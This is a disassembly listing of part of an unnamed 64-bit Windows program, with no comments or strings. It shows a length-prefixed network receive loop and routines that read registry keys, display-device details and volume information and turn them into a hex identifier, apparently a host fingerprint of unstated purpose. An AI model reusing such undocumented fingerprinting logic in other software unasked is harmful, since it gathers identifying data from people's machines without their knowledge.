   140002d76:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140002d7d:	00 00 00 
   140002d80:	8b 7c 24 3c          	mov    0x3c(%rsp),%edi
   140002d84:	0f cf                	bswap  %edi
   140002d86:	8d 47 d0             	lea    -0x30(%rdi),%eax
   140002d89:	3d d0 ff 4f 00       	cmp    $0x4fffd0,%eax
   140002d8e:	77 d7                	ja     0x140002d67
   140002d90:	89 f9                	mov    %edi,%ecx
   140002d92:	e8 79 fa 00 00       	call   0x140012810
   140002d97:	48 85 c0             	test   %rax,%rax
   140002d9a:	48 89 c5             	mov    %rax,%rbp
   140002d9d:	74 c8                	je     0x140002d67
   140002d9f:	4d 8b 65 00          	mov    0x0(%r13),%r12
   140002da3:	31 db                	xor    %ebx,%ebx
   140002da5:	eb 0f                	jmp    0x140002db6
   140002da7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002dae:	00 00 
   140002db0:	01 c3                	add    %eax,%ebx
   140002db2:	39 df                	cmp    %ebx,%edi
   140002db4:	7e 2a                	jle    0x140002de0
   140002db6:	48 63 d3             	movslq %ebx,%rdx
   140002db9:	41 89 f8             	mov    %edi,%r8d
   140002dbc:	45 31 c9             	xor    %r9d,%r9d
   140002dbf:	48 01 ea             	add    %rbp,%rdx
   140002dc2:	41 29 d8             	sub    %ebx,%r8d
   140002dc5:	4c 89 e1             	mov    %r12,%rcx
   140002dc8:	ff d6                	call   *%rsi
   140002dca:	85 c0                	test   %eax,%eax
   140002dcc:	7f e2                	jg     0x140002db0
   140002dce:	48 89 e9             	mov    %rbp,%rcx
   140002dd1:	e8 0a fa 00 00       	call   0x1400127e0
   140002dd6:	eb 8f                	jmp    0x140002d67
   140002dd8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002ddf:	00 
   140002de0:	89 fa                	mov    %edi,%edx
   140002de2:	48 89 e9             	mov    %rbp,%rcx
   140002de5:	e8 66 f8 ff ff       	call   0x140002650
   140002dea:	48 89 e9             	mov    %rbp,%rcx
   140002ded:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002df2:	e8 e9 f9 00 00       	call   0x1400127e0
   140002df7:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140002dfc:	48 83 c4 48          	add    $0x48,%rsp
   140002e00:	5b                   	pop    %rbx
   140002e01:	5e                   	pop    %rsi
   140002e02:	5f                   	pop    %rdi
   140002e03:	5d                   	pop    %rbp
   140002e04:	41 5c                	pop    %r12
   140002e06:	41 5d                	pop    %r13
   140002e08:	c3                   	ret
   140002e09:	90                   	nop
   140002e0a:	90                   	nop
   140002e0b:	90                   	nop
   140002e0c:	90                   	nop
   140002e0d:	90                   	nop
   140002e0e:	90                   	nop
   140002e0f:	90                   	nop
   140002e10:	57                   	push   %rdi
   140002e11:	56                   	push   %rsi
   140002e12:	53                   	push   %rbx
   140002e13:	48 83 ec 40          	sub    $0x40,%rsp
   140002e17:	45 31 c0             	xor    %r8d,%r8d
   140002e1a:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   140002e20:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140002e25:	48 89 cb             	mov    %rcx,%rbx
   140002e28:	48 63 fa             	movslq %edx,%rdi
   140002e2b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002e30:	48 8d 15 a9 14 01 00 	lea    0x114a9(%rip),%rdx        # 0x1400142e0
   140002e37:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140002e3e:	ff 15 0c 97 01 00    	call   *0x1970c(%rip)        # 0x14001c550
   140002e44:	85 c0                	test   %eax,%eax
   140002e46:	75 48                	jne    0x140002e90
   140002e48:	48 8d 44 24 34       	lea    0x34(%rsp),%rax
   140002e4d:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140002e52:	45 31 c9             	xor    %r9d,%r9d
   140002e55:	45 31 c0             	xor    %r8d,%r8d
   140002e58:	48 8d 15 b0 14 01 00 	lea    0x114b0(%rip),%rdx        # 0x14001430f
   140002e5f:	89 7c 24 34          	mov    %edi,0x34(%rsp)
   140002e63:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002e68:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002e6d:	ff 15 e5 96 01 00    	call   *0x196e5(%rip)        # 0x14001c558
   140002e73:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140002e78:	ff 15 b2 96 01 00    	call   *0x196b2(%rip)        # 0x14001c530
   140002e7e:	c6 44 3b ff 00       	movb   $0x0,-0x1(%rbx,%rdi,1)
   140002e83:	48 83 c4 40          	add    $0x40,%rsp
   140002e87:	5b                   	pop    %rbx
   140002e88:	5e                   	pop    %rsi
   140002e89:	5f                   	pop    %rdi
   140002e8a:	c3                   	ret
   140002e8b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002e90:	4c 8d 05 8c 14 01 00 	lea    0x1148c(%rip),%r8        # 0x140014323
   140002e97:	48 89 fa             	mov    %rdi,%rdx
   140002e9a:	48 89 d9             	mov    %rbx,%rcx
   140002e9d:	ff 15 5d 99 01 00    	call   *0x1995d(%rip)        # 0x14001c800
   140002ea3:	c6 44 3b ff 00       	movb   $0x0,-0x1(%rbx,%rdi,1)
   140002ea8:	48 83 c4 40          	add    $0x40,%rsp
   140002eac:	5b                   	pop    %rbx
   140002ead:	5e                   	pop    %rsi
   140002eae:	5f                   	pop    %rdi
   140002eaf:	c3                   	ret
   140002eb0:	57                   	push   %rdi
   140002eb1:	56                   	push   %rsi
   140002eb2:	53                   	push   %rbx
   140002eb3:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   140002eba:	48 8d 35 6e 14 01 00 	lea    0x1146e(%rip),%rsi        # 0x14001432f
   140002ec1:	45 31 c0             	xor    %r8d,%r8d
   140002ec4:	41 b9 19 02 02 00    	mov    $0x20219,%r9d
   140002eca:	48 8b 1d 7f 96 01 00 	mov    0x1967f(%rip),%rbx        # 0x14001c550
   140002ed1:	48 89 f2             	mov    %rsi,%rdx
   140002ed4:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140002edb:	48 8d 7c 24 38       	lea    0x38(%rsp),%rdi
   140002ee0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002ee5:	ff d3                	call   *%rbx
   140002ee7:	85 c0                	test   %eax,%eax
   140002ee9:	74 7d                	je     0x140002f68
   140002eeb:	45 31 c0             	xor    %r8d,%r8d
   140002eee:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002ef3:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   140002ef9:	48 89 f2             	mov    %rsi,%rdx
   140002efc:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140002f03:	ff d3                	call   *%rbx
   140002f05:	85 c0                	test   %eax,%eax
   140002f07:	74 5f                	je     0x140002f68
   140002f09:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   140002f0e:	ba 04 01 00 00       	mov    $0x104,%edx
   140002f13:	48 8b 3d e6 98 01 00 	mov    0x198e6(%rip),%rdi        # 0x14001c800
   140002f1a:	4c 8d 05 27 14 01 00 	lea    0x11427(%rip),%r8        # 0x140014348
   140002f21:	48 89 d9             	mov    %rbx,%rcx
   140002f24:	ff d7                	call   *%rdi
   140002f26:	48 8b 35 3b 97 01 00 	mov    0x1973b(%rip),%rsi        # 0x14001c668
   140002f2d:	48 89 d9             	mov    %rbx,%rcx
   140002f30:	ff d6                	call   *%rsi
   140002f32:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002f35:	75 3c                	jne    0x140002f73
   140002f37:	4c 8d 05 32 14 01 00 	lea    0x11432(%rip),%r8        # 0x140014370
   140002f3e:	ba 04 01 00 00       	mov    $0x104,%edx
   140002f43:	48 89 d9             	mov    %rbx,%rcx
   140002f46:	ff d7                	call   *%rdi
   140002f48:	48 89 d9             	mov    %rbx,%rcx
   140002f4b:	ff d6                	call   *%rsi
   140002f4d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002f50:	0f 95 c0             	setne  %al
   140002f53:	0f b6 c0             	movzbl %al,%eax
   140002f56:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
   140002f5d:	5b                   	pop    %rbx
   140002f5e:	5e                   	pop    %rsi
   140002f5f:	5f                   	pop    %rdi
   140002f60:	c3                   	ret
   140002f61:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002f68:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140002f6d:	ff 15 bd 95 01 00    	call   *0x195bd(%rip)        # 0x14001c530
   140002f73:	b8 01 00 00 00       	mov    $0x1,%eax
   140002f78:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
   140002f7f:	5b                   	pop    %rbx
   140002f80:	5e                   	pop    %rsi
   140002f81:	5f                   	pop    %rdi
   140002f82:	c3                   	ret
   140002f83:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002f8a:	00 00 00 00 
   140002f8e:	66 90                	xchg   %ax,%ax
   140002f90:	41 57                	push   %r15
   140002f92:	41 56                	push   %r14
   140002f94:	41 55                	push   %r13
   140002f96:	41 54                	push   %r12
   140002f98:	55                   	push   %rbp
   140002f99:	57                   	push   %rdi
   140002f9a:	56                   	push   %rsi
   140002f9b:	53                   	push   %rbx
   140002f9c:	48 81 ec 28 04 00 00 	sub    $0x428,%rsp
   140002fa3:	48 8b 3d 96 99 01 00 	mov    0x19996(%rip),%rdi        # 0x14001c940
   140002faa:	31 ed                	xor    %ebp,%ebp
   140002fac:	48 89 8c 24 70 04 00 	mov    %rcx,0x470(%rsp)
   140002fb3:	00 
   140002fb4:	48 8d 9c 24 70 02 00 	lea    0x270(%rsp),%rbx
   140002fbb:	00 
   140002fbc:	c7 84 24 c0 00 00 00 	movl   $0x1a8,0xc0(%rsp)
   140002fc3:	a8 01 00 00 
   140002fc7:	4c 8d a4 24 c0 00 00 	lea    0xc0(%rsp),%r12
   140002fce:	00 
   140002fcf:	4c 8d b4 24 c4 00 00 	lea    0xc4(%rsp),%r14
   140002fd6:	00 
   140002fd7:	4c 8d ac 24 e4 00 00 	lea    0xe4(%rsp),%r13
   140002fde:	00 
   140002fdf:	4c 8d bc 24 94 02 00 	lea    0x294(%rsp),%r15
   140002fe6:	00 
   140002fe7:	eb 54                	jmp    0x14000303d
   140002fe9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002ff0:	f6 84 24 64 01 00 00 	testb  $0x4,0x164(%rsp)
   140002ff7:	04 
   140002ff8:	74 40                	je     0x14000303a
   140002ffa:	45 31 c9             	xor    %r9d,%r9d
   140002ffd:	31 d2                	xor    %edx,%edx
   140002fff:	49 89 d8             	mov    %rbx,%r8
   140003002:	c7 84 24 70 02 00 00 	movl   $0x1a8,0x270(%rsp)
   140003009:	a8 01 00 00 
   14000300d:	4c 89 f1             	mov    %r14,%rcx
   140003010:	ff d7                	call   *%rdi
   140003012:	85 c0                	test   %eax,%eax
   140003014:	74 12                	je     0x140003028
   140003016:	4c 89 f9             	mov    %r15,%rcx
   140003019:	e8 32 f8 00 00       	call   0x140012850
   14000301e:	48 83 f8 04          	cmp    $0x4,%rax
   140003022:	0f 87 70 02 00 00    	ja     0x140003298
   140003028:	4c 89 e9             	mov    %r13,%rcx
   14000302b:	e8 20 f8 00 00       	call   0x140012850
   140003030:	48 83 f8 04          	cmp    $0x4,%rax
   140003034:	0f 87 1e 02 00 00    	ja     0x140003258
   14000303a:	83 c5 01             	add    $0x1,%ebp
   14000303d:	45 31 c9             	xor    %r9d,%r9d
   140003040:	31 c9                	xor    %ecx,%ecx
   140003042:	4d 89 e0             	mov    %r12,%r8
   140003045:	89 ea                	mov    %ebp,%edx
   140003047:	ff d7                	call   *%rdi
   140003049:	85 c0                	test   %eax,%eax
   14000304b:	75 a3                	jne    0x140002ff0
   14000304d:	c7 84 24 c0 00 00 00 	movl   $0x1a8,0xc0(%rsp)
   140003054:	a8 01 00 00 
   140003058:	31 ed                	xor    %ebp,%ebp
   14000305a:	4c 8d b4 24 c4 00 00 	lea    0xc4(%rsp),%r14
   140003061:	00 
   140003062:	4c 8d ac 24 e4 00 00 	lea    0xe4(%rsp),%r13
   140003069:	00 
   14000306a:	4c 8d bc 24 94 02 00 	lea    0x294(%rsp),%r15
   140003071:	00 
   140003072:	eb 51                	jmp    0x1400030c5
   140003074:	0f 1f 40 00          	nopl   0x0(%rax)
   140003078:	f6 84 24 64 01 00 00 	testb  $0x1,0x164(%rsp)
   14000307f:	01 
   140003080:	74 40                	je     0x1400030c2
   140003082:	45 31 c9             	xor    %r9d,%r9d
   140003085:	31 d2                	xor    %edx,%edx
   140003087:	49 89 d8             	mov    %rbx,%r8
   14000308a:	c7 84 24 70 02 00 00 	movl   $0x1a8,0x270(%rsp)
   140003091:	a8 01 00 00 
   140003095:	4c 89 f1             	mov    %r14,%rcx
   140003098:	ff d7                	call   *%rdi
   14000309a:	85 c0                	test   %eax,%eax
   14000309c:	74 12                	je     0x1400030b0
   14000309e:	4c 89 f9             	mov    %r15,%rcx
   1400030a1:	e8 aa f7 00 00       	call   0x140012850
   1400030a6:	48 83 f8 04          	cmp    $0x4,%rax
   1400030aa:	0f 87 e8 01 00 00    	ja     0x140003298
   1400030b0:	4c 89 e9             	mov    %r13,%rcx
   1400030b3:	e8 98 f7 00 00       	call   0x140012850
   1400030b8:	48 83 f8 04          	cmp    $0x4,%rax
   1400030bc:	0f 87 96 01 00 00    	ja     0x140003258
   1400030c2:	83 c5 01             	add    $0x1,%ebp
   1400030c5:	45 31 c9             	xor    %r9d,%r9d
   1400030c8:	31 c9                	xor    %ecx,%ecx
   1400030ca:	4d 89 e0             	mov    %r12,%r8
   1400030cd:	89 ea                	mov    %ebp,%edx
   1400030cf:	ff d7                	call   *%rdi
   1400030d1:	85 c0                	test   %eax,%eax
   1400030d3:	89 c6                	mov    %eax,%esi
   1400030d5:	75 a1                	jne    0x140003078
   1400030d7:	48 8b 3d 22 97 01 00 	mov    0x19722(%rip),%rdi        # 0x14001c800
   1400030de:	4c 8d 64 24 38       	lea    0x38(%rsp),%r12
   1400030e3:	48 8b 2d 66 94 01 00 	mov    0x19466(%rip),%rbp        # 0x14001c550
   1400030ea:	4c 8d 3d fa 12 01 00 	lea    0x112fa(%rip),%r15        # 0x1400143eb
   1400030f1:	4c 8b 35 60 94 01 00 	mov    0x19460(%rip),%r14        # 0x14001c558
   1400030f8:	eb 0f                	jmp    0x140003109
   1400030fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003100:	83 fe 0f             	cmp    $0xf,%esi
   140003103:	0f 8f 34 01 00 00    	jg     0x14000323d
   140003109:	41 89 f1             	mov    %esi,%r9d
   14000310c:	ba 00 01 00 00       	mov    $0x100,%edx
   140003111:	48 89 d9             	mov    %rbx,%rcx
   140003114:	4c 8d 05 7d 12 01 00 	lea    0x1127d(%rip),%r8        # 0x140014398
   14000311b:	83 c6 01             	add    $0x1,%esi
   14000311e:	ff d7                	call   *%rdi
   140003120:	45 31 c0             	xor    %r8d,%r8d
   140003123:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140003128:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   14000312e:	48 89 da             	mov    %rbx,%rdx
   140003131:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140003138:	ff d5                	call   *%rbp
   14000313a:	85 c0                	test   %eax,%eax
   14000313c:	75 c2                	jne    0x140003100
   14000313e:	48 8d 44 24 34       	lea    0x34(%rsp),%rax
   140003143:	45 31 c9             	xor    %r9d,%r9d
   140003146:	45 31 c0             	xor    %r8d,%r8d
   140003149:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000314e:	4c 8d 6c 24 40       	lea    0x40(%rsp),%r13
   140003153:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003158:	4c 89 fa             	mov    %r15,%rdx
   14000315b:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140003162:	00 00 
   140003164:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   14000316b:	00 00 
   14000316d:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
   140003174:	00 00 
   140003176:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   14000317d:	00 00 
   14000317f:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   140003186:	00 00 
   140003188:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
   14000318f:	00 00 
   140003191:	48 c7 44 24 70 00 00 	movq   $0x0,0x70(%rsp)
   140003198:	00 00 
   14000319a:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
   1400031a1:	00 00 
   1400031a3:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
   1400031aa:	00 00 00 00 00 
   1400031af:	48 c7 84 24 88 00 00 	movq   $0x0,0x88(%rsp)
   1400031b6:	00 00 00 00 00 
   1400031bb:	48 c7 84 24 90 00 00 	movq   $0x0,0x90(%rsp)
   1400031c2:	00 00 00 00 00 
   1400031c7:	48 c7 84 24 98 00 00 	movq   $0x0,0x98(%rsp)
   1400031ce:	00 00 00 00 00 
   1400031d3:	48 c7 84 24 a0 00 00 	movq   $0x0,0xa0(%rsp)
   1400031da:	00 00 00 00 00 
   1400031df:	48 c7 84 24 a8 00 00 	movq   $0x0,0xa8(%rsp)
   1400031e6:	00 00 00 00 00 
   1400031eb:	48 c7 84 24 b0 00 00 	movq   $0x0,0xb0(%rsp)
   1400031f2:	00 00 00 00 00 
   1400031f7:	48 c7 84 24 b8 00 00 	movq   $0x0,0xb8(%rsp)
   1400031fe:	00 00 00 00 00 
   140003203:	c7 44 24 34 80 00 00 	movl   $0x80,0x34(%rsp)
   14000320a:	00 
   14000320b:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140003210:	41 ff d6             	call   *%r14
   140003213:	85 c0                	test   %eax,%eax
   140003215:	75 12                	jne    0x140003229
   140003217:	4c 89 e9             	mov    %r13,%rcx
   14000321a:	e8 31 f6 00 00       	call   0x140012850
   14000321f:	48 83 f8 04          	cmp    $0x4,%rax
   140003223:	0f 87 87 00 00 00    	ja     0x1400032b0
   140003229:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000322e:	ff 15 fc 92 01 00    	call   *0x192fc(%rip)        # 0x14001c530
   140003234:	83 fe 0f             	cmp    $0xf,%esi
   140003237:	0f 8e cc fe ff ff    	jle    0x140003109
   14000323d:	48 8b 8c 24 70 04 00 	mov    0x470(%rsp),%rcx
   140003244:	00 
   140003245:	4c 8d 05 aa 11 01 00 	lea    0x111aa(%rip),%r8        # 0x1400143f6
   14000324c:	ba 00 01 00 00       	mov    $0x100,%edx
   140003251:	ff d7                	call   *%rdi
   140003253:	eb 19                	jmp    0x14000326e
   140003255:	0f 1f 00             	nopl   (%rax)
   140003258:	48 8b 8c 24 70 04 00 	mov    0x470(%rsp),%rcx
   14000325f:	00 
   140003260:	41 b8 ff 00 00 00    	mov    $0xff,%r8d
   140003266:	4c 89 ea             	mov    %r13,%rdx
   140003269:	e8 f2 f5 00 00       	call   0x140012860
   14000326e:	48 8b 84 24 70 04 00 	mov    0x470(%rsp),%rax
   140003275:	00 
   140003276:	c6 80 ff 00 00 00 00 	movb   $0x0,0xff(%rax)
   14000327d:	48 81 c4 28 04 00 00 	add    $0x428,%rsp
   140003284:	5b                   	pop    %rbx
   140003285:	5e                   	pop    %rsi
   140003286:	5f                   	pop    %rdi
   140003287:	5d                   	pop    %rbp
   140003288:	41 5c                	pop    %r12
   14000328a:	41 5d                	pop    %r13
   14000328c:	41 5e                	pop    %r14
   14000328e:	41 5f                	pop    %r15
   140003290:	c3                   	ret
   140003291:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003298:	48 8b 8c 24 70 04 00 	mov    0x470(%rsp),%rcx
   14000329f:	00 
   1400032a0:	41 b8 ff 00 00 00    	mov    $0xff,%r8d
   1400032a6:	4c 89 fa             	mov    %r15,%rdx
   1400032a9:	e8 b2 f5 00 00       	call   0x140012860
   1400032ae:	eb be                	jmp    0x14000326e
   1400032b0:	48 8b 8c 24 70 04 00 	mov    0x470(%rsp),%rcx
   1400032b7:	00 
   1400032b8:	41 b8 ff 00 00 00    	mov    $0xff,%r8d
   1400032be:	4c 89 ea             	mov    %r13,%rdx
   1400032c1:	e8 9a f5 00 00       	call   0x140012860
   1400032c6:	48 8b 84 24 70 04 00 	mov    0x470(%rsp),%rax
   1400032cd:	00 
   1400032ce:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400032d3:	c6 80 ff 00 00 00 00 	movb   $0x0,0xff(%rax)
   1400032da:	ff 15 50 92 01 00    	call   *0x19250(%rip)        # 0x14001c530
   1400032e0:	eb 8c                	jmp    0x14000326e
   1400032e2:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400032e9:	00 00 00 00 
   1400032ed:	0f 1f 00             	nopl   (%rax)
   1400032f0:	48 83 ec 38          	sub    $0x38,%rsp
   1400032f4:	48 8d 15 07 11 01 00 	lea    0x11107(%rip),%rdx        # 0x140014402
   1400032fb:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
   140003300:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140003305:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   14000330a:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   14000330f:	e8 7c 6b 00 00       	call   0x140009e90
   140003314:	48 83 c4 38          	add    $0x38,%rsp
   140003318:	c3                   	ret
   140003319:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003320:	41 55                	push   %r13
   140003322:	41 54                	push   %r12
   140003324:	55                   	push   %rbp
   140003325:	57                   	push   %rdi
   140003326:	56                   	push   %rsi
   140003327:	53                   	push   %rbx
   140003328:	48 81 ec 08 03 00 00 	sub    $0x308,%rsp
   14000332f:	4c 8d 25 cc 10 01 00 	lea    0x110cc(%rip),%r12        # 0x140014402
   140003336:	31 c0                	xor    %eax,%eax
   140003338:	b9 40 00 00 00       	mov    $0x40,%ecx
   14000333d:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   140003342:	c7 44 24 48 10 00 00 	movl   $0x10,0x48(%rsp)
   140003349:	00 
   14000334a:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
   140003351:	00 00 
   140003353:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   140003358:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   14000335f:	00 
   140003360:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   140003367:	00 00 
   140003369:	48 8d bc 24 00 01 00 	lea    0x100(%rsp),%rdi
   140003370:	00 
   140003371:	f3 48 ab             	rep stos %rax,(%rdi)
   140003374:	48 8d bc 24 00 01 00 	lea    0x100(%rsp),%rdi
   14000337b:	00 
   14000337c:	48 89 d9             	mov    %rbx,%rcx
   14000337f:	ff 15 d3 92 01 00    	call   *0x192d3(%rip)        # 0x14001c658
   140003385:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   14000338a:	45 31 c0             	xor    %r8d,%r8d
   14000338d:	31 d2                	xor    %edx,%edx
   14000338f:	48 8d 0d 71 10 01 00 	lea    0x11071(%rip),%rcx        # 0x140014407
   140003396:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%rsp)
   14000339d:	00 
   14000339e:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   1400033a5:	00 
   1400033a6:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   1400033ad:	00 00 
   1400033af:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   1400033b6:	00 00 
   1400033b8:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400033bf:	00 00 
   1400033c1:	ff 15 e1 92 01 00    	call   *0x192e1(%rip)        # 0x14001c6a8
   1400033c7:	ba 80 00 00 00       	mov    $0x80,%edx
   1400033cc:	48 89 e9             	mov    %rbp,%rcx
   1400033cf:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
   1400033d6:	00 00 00 00 00 
   1400033db:	48 c7 84 24 88 00 00 	movq   $0x0,0x88(%rsp)
   1400033e2:	00 00 00 00 00 
   1400033e7:	48 c7 84 24 90 00 00 	movq   $0x0,0x90(%rsp)
   1400033ee:	00 00 00 00 00 
   1400033f3:	48 c7 84 24 98 00 00 	movq   $0x0,0x98(%rsp)
   1400033fa:	00 00 00 00 00 
   1400033ff:	48 c7 84 24 a0 00 00 	movq   $0x0,0xa0(%rsp)
   140003406:	00 00 00 00 00 
   14000340b:	48 c7 84 24 a8 00 00 	movq   $0x0,0xa8(%rsp)
   140003412:	00 00 00 00 00 
   140003417:	48 c7 84 24 b0 00 00 	movq   $0x0,0xb0(%rsp)
   14000341e:	00 00 00 00 00 
   140003423:	48 c7 84 24 b8 00 00 	movq   $0x0,0xb8(%rsp)
   14000342a:	00 00 00 00 00 
   14000342f:	48 c7 84 24 c0 00 00 	movq   $0x0,0xc0(%rsp)
   140003436:	00 00 00 00 00 
   14000343b:	48 c7 84 24 c8 00 00 	movq   $0x0,0xc8(%rsp)
   140003442:	00 00 00 00 00 
   140003447:	48 c7 84 24 d0 00 00 	movq   $0x0,0xd0(%rsp)
   14000344e:	00 00 00 00 00 
   140003453:	48 c7 84 24 d8 00 00 	movq   $0x0,0xd8(%rsp)
   14000345a:	00 00 00 00 00 
   14000345f:	48 c7 84 24 e0 00 00 	movq   $0x0,0xe0(%rsp)
   140003466:	00 00 00 00 00 
   14000346b:	48 c7 84 24 e8 00 00 	movq   $0x0,0xe8(%rsp)
   140003472:	00 00 00 00 00 
   140003477:	48 c7 84 24 f0 00 00 	movq   $0x0,0xf0(%rsp)
   14000347e:	00 00 00 00 00 
   140003483:	48 c7 84 24 f8 00 00 	movq   $0x0,0xf8(%rsp)
   14000348a:	00 00 00 00 00 
   14000348f:	e8 7c f9 ff ff       	call   0x140002e10
   140003494:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   140003498:	49 89 d9             	mov    %rbx,%r9
   14000349b:	48 89 f9             	mov    %rdi,%rcx
   14000349e:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   1400034a3:	48 8d 5c 24 60       	lea    0x60(%rsp),%rbx
   1400034a8:	ba 00 02 00 00       	mov    $0x200,%edx
   1400034ad:	4c 8d 05 57 0f 01 00 	lea    0x10f57(%rip),%r8        # 0x14001440b
   1400034b4:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400034b8:	ff 15 42 93 01 00    	call   *0x19342(%rip)        # 0x14001c800
   1400034be:	48 89 f9             	mov    %rdi,%rcx
   1400034c1:	e8 8a f3 00 00       	call   0x140012850
   1400034c6:	49 89 d8             	mov    %rbx,%r8
   1400034c9:	48 89 f9             	mov    %rdi,%rcx
   1400034cc:	89 c2                	mov    %eax,%edx
   1400034ce:	e8 cd e8 ff ff       	call   0x140001da0
   1400034d3:	b9 41 00 00 00       	mov    $0x41,%ecx
   1400034d8:	e8 33 f3 00 00       	call   0x140012810
   1400034dd:	49 89 c5             	mov    %rax,%r13
   1400034e0:	48 89 c6             	mov    %rax,%rsi
   1400034e3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400034e8:	44 0f b6 03          	movzbl (%rbx),%r8d
   1400034ec:	48 89 f1             	mov    %rsi,%rcx
   1400034ef:	4c 89 e2             	mov    %r12,%rdx
   1400034f2:	48 83 c3 01          	add    $0x1,%rbx
   1400034f6:	48 83 c6 02          	add    $0x2,%rsi
   1400034fa:	e8 f1 fd ff ff       	call   0x1400032f0
   1400034ff:	48 39 eb             	cmp    %rbp,%rbx
   140003502:	75 e4                	jne    0x1400034e8
   140003504:	41 c6 45 40 00       	movb   $0x0,0x40(%r13)
   140003509:	b9 00 02 00 00       	mov    $0x200,%ecx
   14000350e:	31 c0                	xor    %eax,%eax
   140003510:	f3 aa                	rep stos %al,(%rdi)
   140003512:	4c 89 e8             	mov    %r13,%rax
   140003515:	48 81 c4 08 03 00 00 	add    $0x308,%rsp
   14000351c:	5b                   	pop    %rbx
   14000351d:	5e                   	pop    %rsi
   14000351e:	5f                   	pop    %rdi
   14000351f:	5d                   	pop    %rbp
   140003520:	41 5c                	pop    %r12
   140003522:	41 5d                	pop    %r13
   140003524:	c3                   	ret
   140003525:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000352c:	00 00 00 00 
   140003530:	55                   	push   %rbp
   140003531:	57                   	push   %rdi
   140003532:	56                   	push   %rsi
   140003533:	53                   	push   %rbx
   140003534:	48 81 ec e8 00 00 00 	sub    $0xe8,%rsp
   14000353b:	31 d2                	xor    %edx,%edx
   14000353d:	41 b8 24 03 00 00    	mov    $0x324,%r8d
   140003543:	48 89 cb             	mov    %rcx,%rbx
   140003546:	e8 d5 f2 00 00       	call   0x140012820
   14000354b:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140003550:	45 31 c0             	xor    %r8d,%r8d
   140003553:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   140003559:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000355e:	48 8d 15 b3 0e 01 00 	lea    0x10eb3(%rip),%rdx        # 0x140014418
   140003565:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   14000356c:	ff 15 de 8f 01 00    	call   *0x18fde(%rip)        # 0x14001c550
